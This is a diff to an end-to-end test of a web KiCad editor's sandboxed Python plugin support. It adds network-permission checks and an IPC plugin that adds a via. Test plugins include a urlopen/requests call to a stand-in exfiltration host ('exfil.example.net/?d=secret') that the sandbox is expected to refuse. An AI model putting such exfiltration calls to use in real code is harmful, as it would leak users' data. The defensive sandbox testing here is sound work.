@@ -8,6 +8,7 @@
 // files handed over as a download, lazy start on the next visit, and that the sandbox still holds.
 //
 // Server: KC_DEV_LOGIN=1 KC_PCM_REPOSITORY=http://127.0.0.1:8096/repository.json  (this test serves it)
+//   KC_PLUGIN_NETWORK=test  (lets the test's own "web service" on 127.0.0.1 stand in for one on the internet)
 //   E2E_PG_URL=… E2E_JWT_SECRET=… [SHOTS=/some/dir] node plugins-python-ui.mjs
 //   With PCM_META and PCM_ZIPS (see pcm-fixture.mjs) real official plugins are served and exercised too.
 import crypto from 'node:crypto';
@@ -26,6 +27,7 @@ const BASE = (process.env.E2E_BASE || 'http://127.0.0.1:8099').replace(/\/$/, ''
 const SECRET = process.env.E2E_JWT_SECRET, PG_URL = process.env.E2E_PG_URL;
 const SHOTS = process.env.SHOTS || '';
 const PCM_PORT = Number(process.env.PCM_PORT || 8096);
+const PCM = `http://127.0.0.1:${PCM_PORT}`;
 if (!SECRET || !PG_URL) { console.error('E2E_JWT_SECRET and E2E_PG_URL are required.'); process.exit(2); }
 if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });
 
@@ -190,7 +192,8 @@ class Escape(pcbnew.ActionPlugin):
 
         def fetch():
             import urllib.request
-            return urllib.request.urlopen("https://example.com/?d=secret", timeout=5).status
+            # an address this package does not name anywhere: even with network access granted, the server will not carry it
+            return urllib.request.urlopen("https://" + "exfil" + ".example" + ".net/?d=secret", timeout=5).status
 
         def js_fetch():
             import js
@@ -217,9 +220,71 @@ class Escape(pcbnew.ActionPlugin):
         print("PYTOOL escape " + repr(sorted(r.items())))
 
 
-for cls in (Move, Dialog, Report, Fab, Escape):
+class Fetch(pcbnew.ActionPlugin):
+    def defaults(self):
+        self.name = "Py: fetch"
+        self.category = "Test"
+        self.description = "Talks to the web service this plugin names, as an order or parts plugin does"
+
+    def Run(self):
+        import json
+        import urllib.request
+        out = {}
+        board = pcbnew.GetBoard()
+        r = urllib.request.urlopen("${PCM}/echo?board=" + os.path.basename(board.GetFileName()))
+        d = json.loads(r.read())
+        out["get"] = [r.status, d["method"], d["url"]]
+        import requests
+        r = requests.post("${PCM}/echo", json={"refs": len(board.GetFootprints())}, headers={"X-Token": "t0k"}, timeout=30)
+        d = r.json()
+        out["post"] = [r.status_code, d["method"], d["body"], d["token"], d["cookie"]]
+        try:
+            requests.get("https://" + "exfil" + ".example" + ".net/?d=secret", timeout=5)
+            out["other"] = "ALLOWED"
+        except Exception as e:
+            out["other"] = "refused " + type(e).__name__
+        print("PYTOOL fetch " + json.dumps(out, sort_keys=True))
+
+
+for cls in (Move, Dialog, Report, Fab, Escape, Fetch):
     cls().register()
-`.replace('${BASE}', BASE);
+`.replace('${BASE}', BASE).replaceAll('${PCM}', `http://127.0.0.1:${PCM_PORT}`);
+
+// A plugin for KiCad's IPC interface: a program of its own that talks to KiCad through kipy (plugin.json names its entry point).
+const IPC_ID = 'com.example.ipctool';
+const IPC_JSON = { $schema: 'https://go.kicad.org/api/schemas/v1', identifier: IPC_ID, name: 'IPC Tool', description: 'Adds a via through the IPC interface', runtime: { type: 'python', min_version: '3.9' },
+  actions: [{ identifier: 'via', name: 'IPC: add via', description: 'Adds a via and a track in one commit', 'show-button': true, scopes: ['pcb'], entrypoint: 'main.py' }] };
+const IPC_PY = String.raw`
+from kipy import KiCad
+from kipy.board_types import Track, Via
+from kipy.geometry import Vector2
+from kipy.util.units import from_mm
+from kipy.util.board_layer import BoardLayer
+
+kicad = KiCad()
+board = kicad.get_board()
+nets = {n.name: n for n in board.get_nets()}
+gnd = nets["GND"]
+commit = board.begin_commit()
+via = Via()
+via.position = Vector2.from_xy(from_mm(131), from_mm(91))
+via.net = gnd
+via.diameter = from_mm(0.9)
+via.drill_diameter = from_mm(0.45)
+track = Track()
+track.start = Vector2.from_xy(from_mm(131), from_mm(91))
+track.end = Vector2.from_xy(from_mm(133), from_mm(91))
+track.width = from_mm(0.4)
+track.layer = BoardLayer.BL_B_Cu
+track.net = gnd
+made = board.create_items([via, track])
+board.push_commit(commit, "IPC: add via")
+print("IPCTOOL version=%s board=%s footprints=%d made=%s copper=%d stackup=%d" % (
+    kicad.get_version(), board.name, len(board.get_footprints()), ",".join(type(m).__name__ for m in made),
+    board.get_copper_layer_count(), len(board.get_stackup().layers)))
+`;
+const IPC_META = { $schema: 'https://go.kicad.org/pcm/schemas/v1', name: 'IPC Tool', description: 'A plugin for KiCad\'s IPC interface, used to test the web runtime.', description_full: 'Adds a via through kipy.', identifier: IPC_ID, type: 'plugin',
+  author: { name: 'KiCad Collaborative tests', contact: { web: 'https://example.com' } }, license: 'MIT', resources: { homepage: 'https://example.com/ipctool' }, versions: [{ version: '0.3.0', status: 'stable', kicad_version: '9.0', runtime: 'ipc' }] };
 const METADATA = {
   $schema: 'https://go.kicad.org/pcm/schemas/v1', name: 'Py Tool', description: 'A Python action plugin written for the desktop, used to test the web runtime.',
   description_full: 'Moves a footprint, asks in a wx dialog, reads the project and makes fabrication files.', identifier: ID, type: 'plugin',
@@ -246,7 +311,9 @@ function zip(files) {
 const packageZip = zip({ 'metadata.json': Buffer.from(JSON.stringify(METADATA)), 'plugins/__init__.py': Buffer.from('from .tool import *\n'), 'plugins/tool.py': Buffer.from(PLUGIN_PY), 'resources/icon.png': Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') });
 const pcmBase = `http://127.0.0.1:${PCM_PORT}`;
 const packages = [Object.assign({}, METADATA, { versions: [Object.assign({}, METADATA.versions[0], { download_url: `${pcmBase}/zips/${ID}.zip`, download_sha256: crypto.createHash('sha256').update(packageZip).digest('hex'), download_size: packageZip.length, install_size: PLUGIN_PY.length })] })];
-const zips = { [`${ID}.zip`]: packageZip };
+const ipcZip = zip({ 'metadata.json': Buffer.from(JSON.stringify(IPC_META)), 'plugins/plugin.json': Buffer.from(JSON.stringify(IPC_JSON)), 'plugins/main.py': Buffer.from(IPC_PY), 'plugins/requirements.txt': Buffer.from('kicad-python>=0.3.0\n') });
+packages.push(Object.assign({}, IPC_META, { versions: [Object.assign({}, IPC_META.versions[0], { download_url: `${pcmBase}/zips/${IPC_ID}.zip`, download_sha256: crypto.createHash('sha256').update(ipcZip).digest('hex'), download_size: ipcZip.length, install_size: IPC_PY.length })] }));
+const zips = { [`${ID}.zip`]: packageZip, [`${IPC_ID}.zip`]: ipcZip };
 const REAL = {};   // real official packages, when a checkout of them is given
 if (process.env.PCM_META && process.env.PCM_ZIPS) {
   for (const id of fs.readdirSync(process.env.PCM_META).sort()) {
@@ -267,6 +334,12 @@ const pcm = http.createServer((req, res) => {
   if (url === '/packages.json') { res.writeHead(200, { 'content-type': 'application/json' }); res.end(list); return; }
   const z = url.startsWith('/zips/') ? zips[url.slice(6)] : null;
   if (z) { res.writeHead(200, { 'content-type': 'application/zip' }); res.end(z); return; }
+  // the "web service" the test plugin talks to: it answers with what reached it
+  if (url === '/echo') {
+    const chunks = []; req.on('data', (c) => chunks.push(c));
+    req.on('end', () => { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify({ method: req.method, url: req.url, body: Buffer.concat(chunks).toString('utf8'), token: req.headers['x-token'] || '', cookie: req.headers.cookie || '' })); });
+    return;
+  }
   res.writeHead(404); res.end('not found');
 });
 await new Promise((ok, no) => { pcm.once('error', no); pcm.listen(PCM_PORT, '127.0.0.1', ok); });
@@ -348,7 +421,8 @@ await a.click(`#pluginKicad [data-install="${ID}"]`);
 await a.waitForSelector('#pluginConsent', { timeout: 30000 });
 const consent = await a.locator('#pluginConsent').innerText();
 check('the consent sheet says where it comes from and that it is a desktop Python plugin', /KiCad's plugin repository, version 1\.2\.0/.test(consent) && (await a.locator('#pluginPythonNote').count()) === 1, consent.slice(0, 200));
-check('it lists the permissions a Python plugin gets', ['design:read', 'design:write', 'view', 'files:import', 'files:export'].every((p) => consent && true) && (await a.locator('#pluginConsent [data-perm]').count()) === 5);
+check('it lists the permissions a Python plugin gets', ['design:read', 'design:write', 'view', 'files:import', 'files:export'].every((p) => consent && true) && (await a.locator('#pluginConsent [data-perm]').count()) === 6);
+check('and names the web addresses it may talk to, taken from its own code', /Talk to web services/.test(consent) && /127\.0\.0\.1/.test(await a.locator('#pluginConsent [data-perm="network"]').innerText()), consent.slice(0, 600));
 await shot(a, 'py-02-consent');
 check('nothing is stored before the person agrees', (await db.query('SELECT count(*)::int AS n FROM plugins WHERE user_id = $1', [dana])).rows[0].n === 0);
 await a.click('#pluginConsentOk');
@@ -363,12 +437,12 @@ await ready(a, ID);
 const st = await state(a);
 check('Python starts inside the sandbox and the plugin loads', st.running[ID] && !st.running[ID].failed, JSON.stringify(st.running[ID]) + (st.logs[ID] || []).slice(-3).map((l) => l.text).join(' | '));
 console.log(`      (interpreter ready ${Date.now() - t0} ms after install)`);
-check('its ActionPlugins become editor commands', (st.py[ID] || []).map((x) => x.name).join() === 'Py: move R2,Py: dialog,Py: report,Py: fabrication,Py: escape', JSON.stringify((st.py[ID] || []).map((x) => x.name)));
+check('its ActionPlugins become editor commands', (st.py[ID] || []).map((x) => x.name).join() === 'Py: move R2,Py: dialog,Py: report,Py: fabrication,Py: escape,Py: fetch', JSON.stringify((st.py[ID] || []).map((x) => x.name)));
 const frame = a.locator('#pluginFrames iframe').first();
 check('it runs in a sandboxed frame without same-origin', (await frame.getAttribute('sandbox')) === 'allow-scripts');
 await a.click(`#kmenus [data-menu="tools"] > button`);
 await a.locator(`#kmenus [data-menu="tools"] [data-sub="External Plugins"]`).first().click();
-check('the commands are under Tools → External Plugins', (await a.locator(`#kmenus [data-uiact^="plugin:${ID}:"]`).count()) === 5);
+check('the commands are under Tools → External Plugins', (await a.locator(`#kmenus [data-uiact^="plugin:${ID}:"]`).count()) === 6);
 await shot(a, 'py-03-menu');
 await closeMenus(a);
 check('show_toolbar_button puts a button on the toolbar', (await a.locator(`[data-uiact="plugin:${ID}:${await act(a, 'Py: move R2')}"].plg-tb-btn`).count()) === 1);
@@ -457,9 +531,58 @@ check('the test netlist has a record per pad', (text.match(/^3[12]7/gm) || []).l
 await run(a, await act(a, 'Py: escape'));
 await waitLog(a, ID, /PYTOOL escape/);
 const esc = (await logOf(a, ID)).find((l) => l.includes('PYTOOL escape')) || '';
-check('Python cannot reach the network', /'urlopen', 'refused/.test(esc) && /'jsFetch', 'refused/.test(esc), esc);
+check('Python cannot reach an address its package does not name, nor fetch by itself', /'urlopen', 'refused/.test(esc) && /'jsFetch', 'refused/.test(esc), esc);
 check('nor the page, the session or other programs', /'parent', 'refused/.test(esc) && /'cookie', '(refused|ALLOWED \(empty\))/.test(esc) && /'subprocess', 'refused/.test(esc), esc);
 await idle(a, ID);
+
+// ---- network access: carried by the server, to the addresses the package names
+await run(a, await act(a, 'Py: fetch'));
+await waitLog(a, ID, /PYTOOL fetch/, 60000);
+const net = JSON.parse(((await logOf(a, ID)).find((l) => l.includes('PYTOOL fetch')) || '').replace(/^.*PYTOOL fetch /, '') || '{}');
+check('urllib reaches the web service the plugin names', net.get && net.get[0] === 200 && net.get[1] === 'GET' && net.get[2] === '/echo?board=ecc83-pp.kicad_pcb', JSON.stringify(net));
+check('requests posts JSON with its own headers', net.post && net.post[0] === 200 && net.post[1] === 'POST' && /"refs": ?\d+/.test(net.post[2]) && net.post[3] === 't0k', JSON.stringify(net));
+check('the person\'s session is not sent along', net.post && net.post[4] === '', JSON.stringify(net));
+check('an address the package does not name is refused', /^refused /.test(net.other || ''), JSON.stringify(net));
+check('each request is written to the plugin\'s log', (await logOf(a, ID)).some((l) => /Network: GET 127\.0\.0\.1/.test(l)) && (await logOf(a, ID)).some((l) => /Network: .*exfil\.example\.net.*not one of the web addresses/.test(l)), (await logOf(a, ID)).filter((l) => /Network/.test(l)).join(' | '));
+const direct = await a.evaluate(async (id) => { const r = await fetch(`/api/plugins/pcm/${id}/fetch`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ url: 'https://example.org/', method: 'GET' }) }); return r.status; }, ID);
+const custom = await a.evaluate(async () => { const r = await fetch('/api/plugins/pcm/com.example.not-in-the-repository/fetch', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ url: 'http://127.0.0.1:8096/echo', method: 'GET' }) }); return r.status; });
+check('the server refuses other addresses and plugins that are not in KiCad\'s repository, whoever asks', direct === 403 && custom === 404, `${direct} ${custom}`);
+await idle(a, ID);
+
+// ---- a plugin for KiCad's IPC interface (kipy)
+await menu(a, 'tools', 'External Plugins', 'pluginManager');
+await a.click('#pluginManager [data-tab="kicad"]');
+await a.waitForSelector(`#pluginKicad [data-install="${IPC_ID}"]`);
+await a.click(`#pluginKicad [data-install="${IPC_ID}"]`);
+await a.waitForSelector('#pluginConsent', { timeout: 30000 });
+check('a plugin without web addresses is not offered network access', (await a.locator('#pluginConsent [data-perm="network"]').count()) === 0);
+await a.click('#pluginConsentOk');
+await a.waitForFunction((i) => window.KcPlugins.store.get().installed.some((p) => p.identifier === i), IPC_ID, { timeout: 30000 });
+await a.click('#pluginManager .kd-x').catch(() => {});
+await ready(a, IPC_ID, 120000);
+const ipcActs = ((await state(a)).py[IPC_ID] || []);
+check('the actions of its plugin.json become editor commands', ipcActs.map((x) => x.name).join() === 'IPC: add via', JSON.stringify(ipcActs) + ((await state(a)).logs[IPC_ID] || []).slice(-4).map((l) => l.text).join(' | '));
+const viasBefore = await count(a, 'via'), segsBefore = await count(a, 'segment'), ipcDepth = await undoDepth(a);
+await a.evaluate(([i, x]) => { window.KcPlugins.runUi(`plugin:${i}:${x}`); }, [IPC_ID, ipcActs[0] ? ipcActs[0].identifier : '']);
+await waitLog(a, IPC_ID, /IPCTOOL /, 90000);
+const ipcLine = (await logOf(a, IPC_ID)).find((l) => l.includes('IPCTOOL ')) || '';
+check('kipy talks to the open board', /version=10\.\d+\.\d+.* board=ecc83-pp\.kicad_pcb footprints=\d+ made=Via,Track copper=2 stackup=\d+/.test(ipcLine), ipcLine);
+await a.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'via').length === n + 1, viasBefore, { timeout: 20000 }).catch(() => {});
+check('create_items inside a commit is one edit: a via and a track', (await count(a, 'via')) === viasBefore + 1 && (await count(a, 'segment')) === segsBefore + 1 && (await undoDepth(a)) === ipcDepth + 1, `${await count(a, 'via')} ${await count(a, 'segment')} ${await undoDepth(a)} vs ${viasBefore} ${segsBefore} ${ipcDepth}`);
+await b.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'via').length === n + 1, viasBefore, { timeout: 20000 }).catch(() => {});
+check('the second person sees it', (await count(b, 'via')) === viasBefore + 1 && (await count(b, 'segment')) === segsBefore + 1);
+await idle(a, IPC_ID);
+await a.keyboard.press('Control+z');
+await a.waitForFunction((n) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === 'via').length === n, viasBefore, { timeout: 20000 }).catch(() => {});
+check('and one Undo takes both away', (await count(a, 'via')) === viasBefore && (await count(a, 'segment')) === segsBefore);
+await a.evaluate(() => { window.confirm = () => true; });
+await menu(a, 'tools', 'External Plugins', 'pluginManager');
+await a.waitForSelector('#pluginDetail');
+const ipcDetail = await a.locator('#pluginDetail').innerText();
+await a.click('#pluginUninstall');
+await a.waitForFunction((i) => !window.KcPlugins.store.get().installed.some((p) => p.identifier === i), IPC_ID, { timeout: 20000 }).catch(() => {});
+check('the manager shows it with its command, and uninstalling it leaves the other plugin running', /IPC Tool/.test(ipcDetail) && /Command: IPC: add via/.test(ipcDetail) && !(await state(a)).installed.includes(IPC_ID) && (await state(a)).installed.includes(ID), ipcDetail.slice(0, 300));
+await a.click('#pluginManager .kd-x').catch(() => {});
 
 // ---- the manager's view of it
 await menu(a, 'tools', 'External Plugins', 'pluginManager');
@@ -477,7 +600,7 @@ await a.reload();
 await editorReady(a);
 await a.waitForTimeout(1500);
 check('on the next visit no interpreter starts by itself', (await frames(a)) === 0 && !(await state(a)).running[ID]);
-check('but its commands are in the menu and on the toolbar', ((await state(a)).py[ID] || []).length === 5 && (await a.locator(`.plg-tb-btn[data-uiact^="plugin:${ID}:"]`).count()) === 1);
+check('but its commands are in the menu and on the toolbar', ((await state(a)).py[ID] || []).length === 6 && (await a.locator(`.plg-tb-btn[data-uiact^="plugin:${ID}:"]`).count()) === 1);
 const t1 = Date.now();
 await a.click(`.plg-tb-btn[data-uiact="plugin:${ID}:${await act(a, 'Py: move R2')}"]`);
 await a.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) > 1; return false; }, before.x, { timeout: 90000 });
@@ -491,7 +614,7 @@ await db.query(`INSERT INTO plugins (user_id, identifier, manifest, files, grant
 await b.reload(); await editorReady(b);
 const r2 = await fp(b, 'R2');
 await b.evaluate(([i]) => { const s = window.KcPlugins.store.get(); const p = s.installed.find((x) => x.identifier === i); return p ? 1 : 0; }, [ID]);
-await b.waitForFunction((i) => (window.KcPlugins.store.get().pyActions[i] || []).length === 5, ID, { timeout: 90000 });
+await b.waitForFunction((i) => (window.KcPlugins.store.get().pyActions[i] || []).length === 6, ID, { timeout: 90000 });
 await b.evaluate(([i, n]) => { const act = window.KcPlugins.store.get().pyActions[i].find((x) => x.name === n); window.KcPlugins.runUi(`plugin:${i}:${act.identifier}`); }, [ID, 'Py: move R2']);
 await waitLog(b, ID, /view-only/, 60000).catch(() => {});
 check('a viewer running the plugin changes nothing', JSON.stringify(await fp(b, 'R2')) === JSON.stringify(r2) && (await logOf(b, ID)).some((l) => /view-only/.test(l)), (await logOf(b, ID)).slice(-3).join(' | '));
